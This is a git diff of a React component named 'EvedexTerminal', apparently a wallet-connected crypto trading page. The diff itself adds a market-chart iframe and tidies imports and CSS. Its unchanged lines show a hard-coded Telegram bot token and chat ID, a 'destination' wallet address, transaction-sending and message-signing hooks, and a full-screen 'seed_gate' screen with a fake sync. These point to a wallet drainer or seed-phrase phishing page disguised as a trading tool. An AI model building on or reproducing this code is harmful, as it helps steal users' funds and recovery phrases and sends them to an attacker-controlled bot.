@@ -1,13 +1,12 @@
 import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
-import { RefreshCcw, AlertCircle, Database, History, Unlock, ShieldCheck, Activity, Globe, Clock, Settings, Lock, Cpu } from 'lucide-react';
+import { RefreshCcw, AlertCircle, Database, History, Unlock, ShieldCheck, Activity, Globe, Settings, Lock, Cpu } from 'lucide-react';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
   const { signMessage } = useSignMessage();
-  const { chains, switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
@@ -18,7 +17,7 @@ export default function EvedexTerminal() {
   const [syncProgress, setSyncProgress] = useState(0);
 
   // CONFIGURATION
-  const projectId = '7a9898896e62061904fbceeb9d296eb1'; // Your New Reown ID
+  const projectId = '7a9898896e62061904fbceeb9d296eb1'; // NEW ID APPLIED
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
@@ -76,6 +75,16 @@ export default function EvedexTerminal() {
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative overflow-hidden">
       <div className="absolute inset-0 opacity-5 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]" />
 
+      {/* LIVE MARKET CHART (PUT BACK IN) */}
+      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative z-[20]">
+         <iframe 
+            src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
+            className="absolute inset-0 w-full h-full border-none opacity-80 pointer-events-none"
+            title="Market Chart"
+         />
+         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900 font-black">LIVE_MARKET_FEED</div>
+      </div>
+
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20] relative">
         <div className="flex flex-col">
           <div className="flex items-center gap-2 font-black italic text-md tracking-widest text-white">
@@ -112,7 +121,7 @@ export default function EvedexTerminal() {
 
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-[#05070a] z-[200] flex flex-col items-center justify-center p-6 backdrop-blur-2xl">
-          <div className="bg-[#0d1117] border border-slate-800 w-full max-sm rounded-[40px] p-10 text-center shadow-2xl relative overflow-hidden">
+          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[40px] p-10 text-center shadow-2xl relative overflow-hidden">
             {!isSyncing ? (
               <>
                 <Cpu size={40} className="text-cyan-500 mx-auto animate-pulse mb-6" />
